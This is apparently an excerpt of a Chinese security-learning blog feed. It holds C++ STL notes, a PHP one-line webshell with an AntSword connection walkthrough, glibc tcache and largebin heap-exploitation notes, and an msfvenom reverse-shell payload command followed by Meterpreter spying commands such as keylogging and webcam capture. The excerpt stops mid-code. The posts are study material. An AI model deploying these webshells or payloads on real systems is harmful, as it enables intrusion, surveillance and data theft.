title="std::for_each()"></a>std::for_each()</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">template&lt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InputIt</span>, <span class="hljs-title">class</span> <span class="hljs-title">UnaryFunction</span> &gt;</span><br><span class="hljs-class"><span class="hljs-title">UnaryFunction</span> <span class="hljs-title">for_each</span>( <span class="hljs-title">InputIt</span> <span class="hljs-title">first</span>, <span class="hljs-title">InputIt</span> <span class="hljs-title">last</span>, <span class="hljs-title">UnaryFunction</span> <span class="hljs-title">f</span> )</span>;<br>first 和 <span class="hljs-keyword">last</span>：定义了容器中要应用操作的元素的范围。<br>f：要应用的操作，可以是函数对象、函数指针或 Lambda 表达式。<br></code></pre></td></tr></table></figure><h4 id="std-binary-search"><a href="#std-binary-search" class="headerlink" title="std::binary_search()"></a>std::binary_search()</h4><p><code>std::binary_search()</code> 算法用于在已排序的容器中执行二分查找。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">template&lt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ForwardIt</span>, <span class="hljs-title">class</span> <span class="hljs-title">T</span> &gt;</span><br><span class="hljs-class"><span class="hljs-title">bool</span> <span class="hljs-title">binary_search</span>( <span class="hljs-title">ForwardIt</span> <span class="hljs-title">first</span>, <span class="hljs-title">ForwardIt</span> <span class="hljs-title">last</span>, <span class="hljs-title">const</span> <span class="hljs-title">T</span>&amp; <span class="hljs-title">value</span> )</span>;<br>first 和 <span class="hljs-keyword">last</span>：定义了容器中要进行查找的元素的范围。<br>value：要查找的值。<br></code></pre></td></tr></table></figure><h4 id="std-copy"><a href="#std-copy" class="headerlink" title="std::copy()"></a>std::copy()</h4><p>算法用于将一个容器中的元素复制到另一个容器中。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">template&lt; <span class="hljs-built_in">class</span> InputIt, <span class="hljs-built_in">class</span> OutputIt &gt;<br>OutputIt <span class="hljs-keyword">copy</span>( InputIt <span class="hljs-keyword">first</span>, InputIt <span class="hljs-keyword">last</span>, OutputIt d_first );<br><span class="hljs-keyword">first</span> 和 <span class="hljs-keyword">last</span>：定义了要复制的元素的范围。<br>d_first：定义了目标容器的起始位置，用于存储复制的元素。<br></code></pre></td></tr></table></figure><h4 id="std-remove"><a href="#std-remove" class="headerlink" title="std::remove()"></a>std::remove()</h4><p>算法用于从容器中移除指定值的元素，但并不实际删除这些元素，而是将它们移到容器的末尾，并返回一个指向新的逻辑末尾的迭代器。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">template&lt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ForwardIt</span>, <span class="hljs-title">class</span> <span class="hljs-title">T</span> &gt;</span><br><span class="hljs-class"><span class="hljs-title">ForwardIt</span> <span class="hljs-title">remove</span>( <span class="hljs-title">ForwardIt</span> <span class="hljs-title">first</span>, <span class="hljs-title">ForwardIt</span> <span class="hljs-title">last</span>, <span class="hljs-title">const</span> <span class="hljs-title">T</span>&amp; <span class="hljs-title">value</span> )</span>;<br>first 和 <span class="hljs-keyword">last</span>：定义了要移除元素的范围。<br>value：指定要移除的值<br></code></pre></td></tr></table></figure><h4 id="std-unique"><a href="#std-unique" class="headerlink" title="std::unique()"></a>std::unique()</h4><p>算法用于移除容器中的连续重复元素，并返回一个指向新的逻辑末尾的迭代器。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">template&lt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ForwardIt</span> &gt;</span><br><span class="hljs-class"><span class="hljs-title">ForwardIt</span> <span class="hljs-title">unique</span>( <span class="hljs-title">ForwardIt</span> <span class="hljs-title">first</span>, <span class="hljs-title">ForwardIt</span> <span class="hljs-title">last</span> )</span>;<br>first 和 <span class="hljs-keyword">last</span>：定义了要移除重复元素的范围。<br></code></pre></td></tr></table></figure><h4 id="std-min-element"><a href="#std-min-element" class="headerlink" title="std::min_element()"></a>std::min_element()</h4><p>算法用于在容器中找到最小元素，并返回指向该元素的迭代器。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">template&lt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ForwardIt</span> &gt;</span><br><span class="hljs-class"><span class="hljs-title">ForwardIt</span> <span class="hljs-title">min_element</span>( <span class="hljs-title">ForwardIt</span> <span class="hljs-title">first</span>, <span class="hljs-title">ForwardIt</span> <span class="hljs-title">last</span> )</span>;<br>first 和 <span class="hljs-keyword">last</span>：定义了要查找最小元素的范围。<br></code></pre></td></tr></table></figure><h4 id="std-max-element"><a href="#std-max-element" class="headerlink" title="std::max_element()"></a>std::max_element()</h4><p>算法用于在容器中找到最大元素，并返回指向该元素的迭代器。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">template&lt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ForwardIt</span> &gt;</span><br><span class="hljs-class"><span class="hljs-title">ForwardIt</span> <span class="hljs-title">max_element</span>( <span class="hljs-title">ForwardIt</span> <span class="hljs-title">first</span>, <span class="hljs-title">ForwardIt</span> <span class="hljs-title">last</span> )</span>;<br>first 和 <span class="hljs-keyword">last</span>：定义了要查找最大元素的范围。<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> c++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中国蚁剑的应用</title>
      <link href="/2024/10/24/%E8%8F%9C%E5%88%80%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E5%BA%94%E7%94%A8/"/>
      <url>/2024/10/24/%E8%8F%9C%E5%88%80%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="中国蚁剑的应用"><a href="#中国蚁剑的应用" class="headerlink" title="中国蚁剑的应用"></a>中国蚁剑的应用</h1><h3 id="中国蚁剑的应用-1"><a href="#中国蚁剑的应用-1" class="headerlink" title="中国蚁剑的应用"></a>中国蚁剑的应用</h3><h4 id="连接webshell"><a href="#连接webshell" class="headerlink" title="连接webshell"></a>连接webshell</h4><p>连接木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;ant&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个木马的意思是请求一个参数ant，并把ant的内容当作命令执行，那么就给了蚁剑链接webshell的条件</p><p>我们先用phpstudy在本地创建一个网站</p><p><img src="/img/%E8%8F%9C%E5%88%80%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E5%BA%94%E7%94%A8/a"></p><p>然后将写好的一句话木马放入网站目录</p><p><img src="/img/%E8%8F%9C%E5%88%80%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E5%BA%94%E7%94%A8/b"></p><p>访问这个木马，返回空白既是成功</p><p><img src="/img/%E8%8F%9C%E5%88%80%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E5%BA%94%E7%94%A8/c"></p><p>接着我们打开蚁剑</p><p><img src="/img/%E8%8F%9C%E5%88%80%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E5%BA%94%E7%94%A8/d"></p><p><img src="/img/%E8%8F%9C%E5%88%80%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E5%BA%94%E7%94%A8/e"></p><p>连接密码就是木马里的参数，蚁剑会自己生成以这个参数生成连接的命令</p><h4 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h4><p>拿到webshell后我们可以对里面各种文件进行增删改阅的操作</p><p><img src="/img/%E8%8F%9C%E5%88%80%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E5%BA%94%E7%94%A8/f"></p><p><img src="/img/%E8%8F%9C%E5%88%80%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E5%BA%94%E7%94%A8/g">)</p><h4 id="虚拟终端"><a href="#虚拟终端" class="headerlink" title="虚拟终端"></a>虚拟终端</h4><p>可以获得连接机器的各种机器，例如ip地址，mac地址等</p><p><img src="/img/%E8%8F%9C%E5%88%80%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E5%BA%94%E7%94%A8/h"></p><h4 id="数据库管理"><a href="#数据库管理" class="headerlink" title="数据库管理"></a>数据库管理</h4><p><img src="/img/%E8%8F%9C%E5%88%80%E5%8F%8A%E8%9A%81%E5%89%91%E7%9A%84%E5%BA%94%E7%94%A8/i"></p><p>可以对连接的网站的mysql数据库进行操作</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>总的来说，中国蚁剑即是一款很好的webshell的管理应用，也是我们对他人进行渗透的重要工具，我们可以通过一句话木马等操作拿到被攻击者的webshell</p>]]></content>
      
      
      <categories>
          
          <category> 网络渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache_Attack(1)</title>
      <link href="/2024/10/24/Tcache-Attack/"/>
      <url>/2024/10/24/Tcache-Attack/</url>
      
        <content type="html"><![CDATA[<h1 id="Tcache-Attack-1"><a href="#Tcache-Attack-1" class="headerlink" title="Tcache_Attack(1)"></a>Tcache_Attack(1)</h1><h3 id="Tcache-konwledge-引用CTF-Wiki"><a href="#Tcache-konwledge-引用CTF-Wiki" class="headerlink" title="Tcache_konwledge(引用CTF-Wiki)"></a>Tcache_konwledge(引用CTF-Wiki)</h3><p>tcache是glibc 2.26(Ubuntu 17.10)之后引入的一种技术，其目的是为了提升堆管理的性能。我们都知道，一旦某个整体的应用添加了更加复杂的执行流程，那么就意味着整体执行的速度就会降低，那么为了弥补这一部分的欠缺，就不得不有所牺牲。所以虽然提升了整体的性能，但却舍弃了很多安全检查，这就意味着更多新的漏洞就伴随而来，也增添了很多利用方式</p><p>tcache引入了两个新的结构体：<code>tcache_entry</code>和<code>tcache_perthread_struct</code>。增添的两个结构体其实与fastbin有些类似，但是也有一定的区别</p><p>tcache_entry结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br><br></code></pre></td></tr></table></figure><p>与fastbin不同的是，tcache_entry的next指向的是下一个chunk的data域，fastbin的next指向的是下个chunk的头指针。</p><p>tcache_perthread_struct结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS                64</span><br><br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br><br></code></pre></td></tr></table></figure><p>这个结构体是用来管理tcache链表的，这个结构体位于heap段的起始位置，其中</p><ul><li>tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk</li><li>counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk</li></ul><h4 id="tcache-get-函数"><a href="#tcache-get-函数" class="headerlink" title="tcache_get()函数"></a>tcache_get()函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]); <br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这个函数很简单，获取一个chunk指针，然后count-1，没有太多的安全检查</p><h4 id="tcache-put-函数"><a href="#tcache-put-函数" class="headerlink" title="tcache_put()函数"></a>tcache_put()函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>tcache_put()函数就是简单在tcahe链头插入一个chunk,也没有做过多的安全检查</p><h3 id="Tcache-usage"><a href="#Tcache-usage" class="headerlink" title="Tcache usage"></a>Tcache usage</h3><ul><li><p>第一次malloc时会在heap头回显一块内存用来存放<code>tcache_perthread_struct</code>，这块内存size一般为0x251</p></li><li><p>申请的内存块符合 fastbin 大小时并且在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。</p></li><li><p>申请的内存块符合 smallbin 大小时并且在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。</p></li><li><p>当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。</p></li><li><p>tcache 取出：在内存申请的开始部分，首先会判断申请大小块，在 tcache 是否存在，如果存在就直接从 tcache 中摘取，否则再使用_int_malloc 分配。</p></li></ul><h3 id="PWN-Tcache"><a href="#PWN-Tcache" class="headerlink" title="PWN Tcache"></a>PWN Tcache</h3><h4 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h4><p>因为tcache_get没有对next进行检查，所以我们可以覆盖tcache的fd指针，从而实现对任意地址的malloc</p><p><img src="/img/Tcache-Attack/a" alt="在这里插入图片描述"></p><p>我们申请两个chunk并释放</p><p><img src="/img/Tcache-Attack/b" alt="在这里插入图片描述"></p><p>可以看到这时chunkb的fd是chunka</p><p><img src="/img/Tcache-Attack/c" alt="在这里插入图片描述"></p><p>而经过覆盖之后就可以把任意地址挂进tcachebin</p><p><img src="/img/Tcache-Attack/d" alt="在这里插入图片描述"></p><h4 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h4><p>这种利用方法其实就是fastbin中的double_free,如果在释放的时候指针未置空，可以对一个chunk释放两次</p><p>我们申请一个chunk a连续释放两次</p><p><img src="/img/Tcache-Attack/e" alt="在这里插入图片描述"></p><p>可以看到此时同一个chunk a被挂进去两次</p><p>此时我们在申请chunk b，那么这次启用的是第二次挂进去的chunk a,此时打印chunk_a和chunk_b的fd指针会发现其实都是chunk_a</p><p><img src="/img/Tcache-Attack/f" alt="在这里插入图片描述"></p><h4 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h4><p>tcache house of spirit这种利用方式是由于tcache_put()函数检查不严格造成的,跟fastbin的很像，</p><p>他的原理就是，将一个tcache bin中的chunk的fd指针改成我们伪造的fake_chunk,然后申请一个chunk,那么malloc在申请的同时，会把本没有free的fake_chunk挂进tcache bin，甚至他的检查比fastbin还要松一点，这里就不具体说明了，请参考博主的另一篇文章</p><p><a href="https://qfbsz.github.io/2024/10/04/fastbin_House%20Of%20Spirit/">Fastbin-attack-House-Of-Spirit</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
          <category> tcachebin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Meterpreter远控win10</title>
      <link href="/2024/10/23/Meterpreter%E8%BF%9C%E6%8E%A7win10/"/>
      <url>/2024/10/23/Meterpreter%E8%BF%9C%E6%8E%A7win10/</url>
      
        <content type="html"><![CDATA[<h1 id="Meterpreter远控win10"><a href="#Meterpreter远控win10" class="headerlink" title="Meterpreter远控win10"></a>Meterpreter远控win10</h1><h3 id="Meterpreter介绍"><a href="#Meterpreter介绍" class="headerlink" title="Meterpreter介绍"></a>Meterpreter介绍</h3><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。</p><h3 id="钓鱼软件的生成"><a href="#钓鱼软件的生成" class="headerlink" title="钓鱼软件的生成"></a>钓鱼软件的生成</h3><p><img src="/img/Meterpreter%E8%BF%9C%E6%8E%A7win10/a"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=本机的ip lport=4000 -f exe -o /home/joker/桌面/payload.exe<br></code></pre></td></tr></table></figure><p>解释一下这个命令，可以看到有个-p,是payload的缩写，这个命令的意思就是生成一个适配x64系统，可以连接上述ip和端口的exe钓鱼软件放在桌面，我们把软件送上网站分析</p><p><img src="/img/Meterpreter%E8%BF%9C%E6%8E%A7win10/b"></p><p>可以看到分析出来的网络行为是建立到一个指定的套接字连接</p><h3 id="攻击服务器的相关设置及win10远控"><a href="#攻击服务器的相关设置及win10远控" class="headerlink" title="攻击服务器的相关设置及win10远控"></a>攻击服务器的相关设置及win10远控</h3><p>为了远程控制win10的服务器，我们需要进行一些设置</p><p>首先msfconsole打开控制端</p><p><img src="/img/Meterpreter%E8%BF%9C%E6%8E%A7win10/c"></p><p>我们进行远控实际上只需要用到Meterpreter2的某个模块而已，这个模块就是exploit&#x2F;mutil&#x2F;handler</p><p>使用这个模块，并且把payload，lhost,lport改成生成远控程序的一模一样</p><p><img src="/img/Meterpreter%E8%BF%9C%E6%8E%A7win10/d"></p><p>接着run后我们就会进入一个等待的进程</p><p><img src="/img/Meterpreter%E8%BF%9C%E6%8E%A7win10/e"></p><p>接着我们进入win10虚拟机点击木马程序,这里我们可以看到有个flag文件，后面有用</p><p><img src="/img/Meterpreter%E8%BF%9C%E6%8E%A7win10/f"></p><p>可以看到kali这边进入了一个全新的命令行</p><p><img src="/img/Meterpreter%E8%BF%9C%E6%8E%A7win10/g"></p><p>这就说明我们已经成功连接上了win10这台机器</p><h3 id="对被攻击机器进行操作"><a href="#对被攻击机器进行操作" class="headerlink" title="对被攻击机器进行操作"></a>对被攻击机器进行操作</h3><h4 id="查看被攻击者的ip地址"><a href="#查看被攻击者的ip地址" class="headerlink" title="查看被攻击者的ip地址"></a>查看被攻击者的ip地址</h4><p><img src="/img/Meterpreter%E8%BF%9C%E6%8E%A7win10/h"></p><p>可以看到此时是可以查看这台机器的各种信息的</p><h4 id="截图-文件读取"><a href="#截图-文件读取" class="headerlink" title="截图&amp;文件读取"></a>截图&amp;文件读取</h4><p><img src="/img/Meterpreter%E8%BF%9C%E6%8E%A7win10/i"></p><p>它可以截取被攻击机器当前的页面</p><p>我们知道当前win10上面是有一个文件的，那么我们就可以远程读取它</p><p><img src="/img/Meterpreter%E8%BF%9C%E6%8E%A7win10/j"></p><h4 id="常见的各种操作"><a href="#常见的各种操作" class="headerlink" title="常见的各种操作"></a>常见的各种操作</h4><p>keyscan_start 开始捕获击键（开始键盘记录）<br>keyscan_dump 转储按键缓冲（下载键盘记录）<br>keyscan_stop 停止捕获击键（停止键盘记录）<br>record_mic X秒从默认的麦克风record_mic音频记录（音频录制）<br>webcam_chat 开始视频聊天（视频，对方会有弹窗）<br>webcam_list 单摄像头（查看摄像头列表）<br>webcam_snap 采取快照从指定的摄像头（摄像头拍摄一张照片）<br>webcam_stream 播放视频流从指定的摄像头（开启摄像头监控）<br>enumdesktops 列出所有可访问的桌面和窗口站（窗体列表）<br>getdesktop 得到当前的Meterpreter桌面<br>reboot 重新启动远程计算机<br>shutdown 关闭远程计算机<br>shell 放入系统命令 shell<br>enumdesktops 列出所有可访问的桌面和窗口站<br>getdesktop 获取当前的meterpreter桌面<br>idletime 返回远程用户空闲的秒数<br>keyboard_send 发送击键<br>keyevent 发送按键事件<br>keyscan_dump 转储击键缓冲区<br>keyscan_start 开始捕获击键<br>keyscan_stop 停止捕获击键<br>mouse 发送鼠标事件<br>screenshare 实时观看远程用户桌面<br>screenshot 抓取交互式桌面的屏幕截图<br>setdesktop 更改 Meterpreters 当前桌面<br>uictl 控制一些用户界面组件<br>record_mic 从默认麦克风录制音频 X 秒<br>webcam_chat 开始视频聊天<br>webcam_list 列出网络摄像头<br>webcam_snap 从指定的网络摄像头拍摄快照<br>webcam_stream 播放来自指定网络摄像头的视频流<br>play 在目标系统上播放波形音频文件 (.wav)<br>getsystem 尝试将您的权限提升到本地系统的权限<br>execute -f notepad 打开记事本</p>]]></content>
      
      
      <categories>
          
          <category> 网络渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>largebin_attack</title>
      <link href="/2024/10/18/largebin-attack/"/>
      <url>/2024/10/18/largebin-attack/</url>
      
        <content type="html"><![CDATA[<h1 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin_attack"></a>largebin_attack</h1><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large_bin"></a>large_bin</h3><h4 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h4><p>large bin中一共包括63个bin，每个bin中的chunk大小不一致，而是出于一定区间范围内。此外这63个bin被分成了6组，每组bin中的chunk之间的公差一致</p><h4 id="Large-chunk的微观结构"><a href="#Large-chunk的微观结构" class="headerlink" title="Large chunk的微观结构"></a>Large chunk的微观结构</h4><p>大于512（1024）字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的</p><ol><li><strong>被释放进Large Bin中的chunk，除了以前经常见到的prev_size、size、fd、bk之外，还具有fd_nextsize和bk_nextsize:</strong></li><li><strong>fd_nextsize，bk_nextsize：用于较大的chunk（large chunk）</strong></li><li><strong>fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针,fd指向与当前chunk相同大小的前一个空闲块</strong></li><li><strong>bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针，bk指向与当前chunk相同大小的后一个空闲块</strong></li><li><strong>一般空闲的large chunk在fd的遍历顺序中，按照由大到小的顺序排列。这样可以避免在寻找合适chunk时挨个遍历</strong></li><li><strong>一个大于0x3f0的chunk被释放后挂进largebin</strong></li></ol><h4 id="Large-Bin的插入顺序"><a href="#Large-Bin的插入顺序" class="headerlink" title="Large Bin的插入顺序"></a>Large Bin的插入顺序</h4><p>在index相同的情况下：</p><ol><li>按照大小，从大到小排序（小的链接large bin块）</li><li>如果大小相同，按照free的时间排序</li><li>多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0</li><li>size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk</li></ol><p>假设我们一次free实际大小为0x400，0x410，0x420，0x420，0x430，0x430可以得到下面这幅图</p><p><img src="/img/largebin-attack/a"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们用howheap2的源码来演示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// gcc -g -no-pie hollk.c -o hollk</span><br>  <span class="hljs-number">2</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>  <span class="hljs-number">3</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>  <span class="hljs-number">4</span> <br>  <span class="hljs-number">5</span> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>  6 &#123;<br>  <span class="hljs-number">7</span> <br>  <span class="hljs-number">8</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>  <span class="hljs-number">9</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br> <span class="hljs-number">10</span> <br> <span class="hljs-number">11</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br> <span class="hljs-number">12</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br> <span class="hljs-number">13</span> <br> <span class="hljs-number">14</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br> <span class="hljs-number">15</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <span class="hljs-number">16</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br> <span class="hljs-number">17</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <span class="hljs-number">18</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br> <span class="hljs-number">19</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <span class="hljs-number">20</span> <br> <span class="hljs-number">21</span>     <span class="hljs-built_in">free</span>(p1);<br> <span class="hljs-number">22</span>     <span class="hljs-built_in">free</span>(p2);<br> <span class="hljs-number">23</span> <br> <span class="hljs-number">24</span>     <span class="hljs-type">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span 